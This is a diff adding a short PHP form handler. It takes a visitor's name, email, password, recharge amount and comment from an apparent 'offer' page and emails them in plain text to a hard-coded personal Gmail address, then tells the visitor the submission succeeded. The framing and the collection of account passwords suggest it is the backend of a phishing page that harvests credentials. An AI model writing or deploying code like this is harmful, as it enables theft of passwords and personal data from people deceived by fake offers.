@@ -1,0 +1,25 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Collect and sanitize form data
+    $name = htmlspecialchars(trim($_POST['name']));
+    $email = htmlspecialchars(trim($_POST['email']));
+    $password = htmlspecialchars(trim($_POST['password']));
+    $amount = htmlspecialchars(trim($_POST['amount']));
+    $comment = htmlspecialchars(trim($_POST['comment']));
+
+    // Prepare email
+    $to = 'bamniyalokesh534@gmail.com'; // Replace with your email address
+    $subject = 'New Offer Submission';
+    $message = "Full Name: $name\nEmail: $email\nPassword: $password\nRecharge Amount: ₹$amount\nComment: $comment";
+    $headers = 'From: ' . $email . "\r\n" .
+               'Reply-To: ' . $email . "\r\n" .
+               'X-Mailer: PHP/' . phpversion();
+
+    // Send email
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Your data has been submitted successfully!";
+    } else {
+        echo "Error sending email.";
+    }
+}
+?>
